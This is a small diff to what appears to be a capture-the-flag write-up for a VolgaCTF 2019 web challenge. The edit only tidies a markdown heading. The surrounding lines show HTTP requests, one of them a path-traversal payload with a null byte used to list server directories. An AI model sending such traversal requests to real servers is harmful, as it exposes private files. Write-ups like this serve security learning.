@@ -11,7 +11,7 @@ GET /api\images?year=2018 HTTP/1.1
 Host: gallery.q.2019.volgactf.ru
 ```
 
-**PHP Directory Listing **
+**PHP Directory Listing**
 ```
 GET /api\images?year=../../../../../../%00 HTTP/1.1
 Host: gallery.q.2019.volgactf.ru
